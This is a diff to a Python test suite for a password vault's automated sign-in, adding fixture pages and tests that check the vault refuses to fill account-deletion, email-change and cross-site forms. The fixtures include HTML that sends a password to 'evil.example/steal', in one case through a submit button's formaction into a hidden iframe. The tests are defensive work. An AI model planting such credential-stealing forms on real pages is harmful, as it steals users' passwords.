@@ -26,6 +26,15 @@ PAGES = {
     "/code": b'<form method="post" action="/c"><input name="otp" '
     b'autocomplete="one-time-code"><button>Verify</button></form>',
     "/home": b"<p>Welcome back</p>",
+    "/delete": b'<h1>Delete your account</h1><form method="post" action="/gone">'
+    b'<input type="password" name="password" autocomplete="current-password">'
+    b"<button>Continue</button></form>",
+    "/change-email": b'<form method="post" action="/email"><input type="email" '
+    b'name="email"><input type="password" name="password">'
+    b'<input name="card" autocomplete="cc-number"><button>Save</button></form>',
+    "/sneaky": b'<form method="post" action="/p"><input type="password" '
+    b'name="password"><button formaction="https://evil.example/steal" '
+    b'formtarget="f">Sign in</button></form><iframe name="f"></iframe>',
     "/elsewhere": b'<form method="post" action="https://evil.example/steal">'
     b'<input type="password" name="password"><button>Sign in</button></form>',
 }
@@ -73,6 +82,15 @@ class VaultSigninTests(unittest.TestCase):
         )
         self.navigate(task.task_id, opened.session_id, path)
         return task.task_id, opened.session_id, self.service.client(task.task_id)
+
+    def arrive(self, task, session, path):
+        self.navigate(task, session, path)
+        self.wait_for(
+            lambda: (
+                self.service.backend.inspect(session).url.endswith(path)
+                and self.service.backend.inspect(session).load_success is True
+            )
+        )
 
     def finished(self, client, request_id):
         def done():
@@ -175,6 +193,29 @@ class VaultSigninTests(unittest.TestCase):
             )["request_id"],
         )
         # A form that would send the password to another site is not filled.
+        self.assertNotEqual(result["outcome"], "signed_in")
+        self.assertEqual(self.posted, [])
+        # Pages that ask for a password to do something else are not signed in.
+        for path, request in (("/delete", "d1"), ("/change-email", "d2")):
+            self.arrive(task, session, path)
+            result = self.finished(
+                client,
+                self.command(
+                    "signin.request",
+                    client=client,
+                    session_id=session,
+                    request_id=request,
+                )["request_id"],
+            )
+            self.assertEqual(result["outcome"], "not_a_sign_in_form", path)
+        # A submit button that would send the form to another site.
+        self.arrive(task, session, "/sneaky")
+        result = self.finished(
+            client,
+            self.command(
+                "signin.request", client=client, session_id=session, request_id="s1"
+            )["request_id"],
+        )
         self.assertNotEqual(result["outcome"], "signed_in")
         self.assertEqual(self.posted, [])
         self.vault.delete(self.vault.logins(self.origin)[0].id)
